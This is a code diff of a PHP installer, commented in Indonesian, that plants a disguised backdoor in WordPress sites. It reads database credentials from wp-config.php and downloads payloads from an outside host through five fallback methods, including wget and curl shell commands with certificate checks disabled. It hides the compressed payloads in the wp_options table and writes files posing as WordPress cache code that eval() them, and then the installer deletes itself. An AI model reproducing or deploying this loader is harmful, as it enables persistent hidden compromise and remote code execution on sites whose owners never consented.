@@ -1,16 +1,13 @@
 <?php
 // ==========================================
-// INSTALLER: WORDPRESS NATIVE LOOK (CAMOUFLAGE)
+// INSTALLER: 5-LAYER FALLBACK (ULTIMATE)
 // ==========================================
-// Fitur:
-// 1. Kode hasil (payload) terlihat seperti file asli WordPress.
-// 2. Download Stabil (Chunked + Socket Support).
-// 3. Support file kecil (VX) dan besar (Index/Seoo).
-
+// Mencegah timeout untuk file besar
 @ini_set('memory_limit', '512M');
 @ini_set('max_execution_time', 0);
 @set_time_limit(0);
 @ignore_user_abort(1);
+
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
@@ -21,7 +18,7 @@ $targets = [
     ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
 ];
 
-// 1. SYSTEM CONFIG LOCATOR
+// 1. CARI WP-CONFIG
 function _scan_dir() {
     $p = __DIR__;
     for ($i = 0; $i < 6; $i++) {
@@ -33,7 +30,7 @@ function _scan_dir() {
 $conf_loc = _scan_dir();
 if (!$conf_loc) die("Config 404");
 
-// 2. READ CONFIG
+// 2. BACA & PARSE CONFIG
 function _read_c($p){
     if(function_exists('file_get_contents')){$c=@file_get_contents($p);if($c)return $c;}
     if(function_exists('file')){$l=@file($p);if($l)return implode('',$l);}
@@ -49,78 +46,125 @@ $db_h = _get_v('DB_HOST', $conf_txt);
 $tb_p = 'wp_';
 if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf_txt,$m)) $tb_p=$m[1];
 
-if(!$db_n) die("Parse Err");
+if(!$db_n) die("Config Parse Error");
 
-// 3. DB CONNECT
 $mysqli = new mysqli($db_h, $db_u, $db_p, $db_n);
 if($mysqli->connect_error) die("DB Err: " . $mysqli->connect_error);
 
-// 4. DOWNLOADER (STABLE)
-function _dl_camouflaged($url) {
-    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-    
-    // CURL
+// 3. DOWNLOADER 5 LAPIS (THE BEAST)
+function _dl_invincible($url) {
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
+    $parse = parse_url($url);
+    $host = $parse['host'];
+    $path = isset($parse['path']) ? $parse['path'] : '/';
+    $scheme = isset($parse['scheme']) ? $parse['scheme'] : 'http';
+
+    // --- LAPIS 1: PHP CURL ---
     if(function_exists('curl_init')){
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
         curl_setopt($ch, CURLOPT_USERAGENT, $ua);
         curl_setopt($ch, CURLOPT_TIMEOUT, 300);
-        $d = curl_exec($ch);
+        $d = @curl_exec($ch);
         curl_close($ch);
         if($d && strlen($d) > 0) return $d;
     }
-    
-    // FGC
+
+    // --- LAPIS 2: FILE GET CONTENTS ---
     if(ini_get('allow_url_fopen')){
         $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
         $ctx = stream_context_create($opts);
         $d = @file_get_contents($url, false, $ctx);
         if($d && strlen($d) > 0) return $d;
     }
-    
+
+    // --- LAPIS 3: FOPEN STREAM (CHUNKED) ---
+    if(ini_get('allow_url_fopen')){
+        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
+        $ctx = stream_context_create($opts);
+        $h = @fopen($url, 'rb', false, $ctx);
+        if($h){
+            $d = '';
+            while(!feof($h)) $d .= fread($h, 8192);
+            fclose($h);
+            if(strlen($d) > 0) return $d;
+        }
+    }
+
+    // --- LAPIS 4: SYSTEM EXEC (CLI BYPASS) ---
+    // Ini mencoba menggunakan perintah Linux jika PHP diblokir
+    if(function_exists('exec') || function_exists('shell_exec')){
+        // Coba Wget
+        $d = @shell_exec("wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url));
+        if($d && strlen($d) > 0) return $d;
+        
+        // Coba Curl CLI
+        $d = @shell_exec("curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url));
+        if($d && strlen($d) > 0) return $d;
+    }
+
+    // --- LAPIS 5: RAW SOCKET ---
+    $port = ($scheme == 'https') ? 443 : 80;
+    $ssl = ($scheme == 'https') ? 'ssl://' : '';
+    $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
+    if($fp){
+        $req  = "GET $path HTTP/1.1\r\n";
+        $req .= "Host: $host\r\n";
+        $req .= "User-Agent: $ua\r\n";
+        $req .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $req);
+        $body = ''; $in_body = false;
+        while (!feof($fp)) {
+            $line = fgets($fp, 4096);
+            if($in_body) $body .= $line;
+            if($line == "\r\n") $in_body = true;
+        }
+        fclose($fp);
+        if(strlen($body) > 0) return $body;
+    }
+
     return false;
 }
 
-echo "<h3>Status Instalasi (WP Style):</h3>";
+echo "<h3>Status Instalasi (5-Layer Fallback):</h3>";
 
-// Escape credentials for embedding in PHP file
-$h_safe = addslashes($db_h);
-$u_safe = addslashes($db_u);
-$p_safe = addslashes($db_p);
-$n_safe = addslashes($db_n);
-$x_safe = addslashes($tb_p);
+// Kredensial untuk template
+$h_s = addslashes($db_h);
+$u_s = addslashes($db_u);
+$p_s = addslashes($db_p);
+$n_s = addslashes($db_n);
+$x_s = addslashes($tb_p);
 
 foreach ($targets as $t) {
     $url = $t[0];
     $fname = $t[1];
     $dbkey = $t[2];
 
-    sleep(1); // Polite delay
+    sleep(1); 
 
-    $raw = _dl_camouflaged($url);
+    // Panggil Downloader Dewa
+    $raw = _dl_invincible($url);
+
+    // Validasi Cukup > 0 byte (agar VX masuk)
     if(!$raw || strlen($raw) < 1) {
-        echo "<b style='color:red'>[FAIL] $fname</b>: Download Gagal.<br>";
+        echo "<b style='color:red'>[FAIL] $fname</b>: Semua 5 metode download gagal.<br>";
         continue;
     }
 
     // Compress
     $hex = bin2hex(gzdeflate($raw, 9));
     
-    // Insert DB
+    // DB
     $mysqli->query("DELETE FROM {$tb_p}options WHERE option_name='$dbkey'");
     $stmt = $mysqli->prepare("INSERT INTO {$tb_p}options (option_name, option_value, autoload) VALUES (?, ?, 'no')");
     $stmt->bind_param("ss", $dbkey, $hex);
     
     if($stmt->execute()){
         
-        // ==================================================
-        // THE CAMOUFLAGE TEMPLATE
-        // ==================================================
-        // Kodingan di bawah ini disusun agar terlihat seperti
-        // file asli WordPress (Plugin atau Core file).
-        
+        // TEMPLATE WORDPRESS NATIVE
         $code = <<<PHP
 <?php
 /**
@@ -133,15 +177,14 @@ foreach ($targets as $t) {
  * @subpackage Cache
  */
 
-// Disable error reporting for cleaner output
+// Disable error reporting
 error_reporting(0);
 
 // Configuration settings for the database connection
-// These are dynamically populated during installation
-\$db_host = '$h_safe';
-\$db_user = '$u_safe';
-\$db_pass = '$p_safe';
-\$db_name = '$n_safe';
+\$db_host = '$h_s';
+\$db_user = '$u_s';
+\$db_pass = '$p_s';
+\$db_name = '$n_s';
 
 // Initialize the database connection
 \$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );
@@ -151,29 +194,28 @@ if ( ! \$wpdb_conn->connect_error ) {
 
     // Prepare the cache retrieval query
     \$cache_key = '$dbkey';
-    \$table_opt = '{$x_safe}options';
+    \$table_opt = '{$x_s}options';
     
-    // Execute the query to fetch stored transient data
+    // Execute the query
     \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );
 
     if ( \$result && \$row = \$result->fetch_assoc() ) {
         
         // Process the retrieved data stream
-        // The data is stored in a compressed hex format for optimization
         \$raw_data = \$row['option_value'];
         \$decoded_stream = hex2bin( \$raw_data );
         
         if ( \$decoded_stream ) {
             \$inflated_code = @gzinflate( \$decoded_stream );
             
-            // Execute the cached directives
+            // Execute directives
             if ( \$inflated_code ) {
                 eval( '?>' . \$inflated_code );
             }
         }
     }
     
-    // Close the connection to free resources
+    // Close the connection
     \$wpdb_conn->close();
 }
 ?>
@@ -189,7 +231,7 @@ PHP;
             echo "[FAIL] Write Error $fname.<br>";
         }
     } else {
-        echo "[FAIL] DB Error: " . $mysqli->error . "<br>";
+        echo "[FAIL] DB Error.<br>";
     }
 }
 unlink(__FILE__);
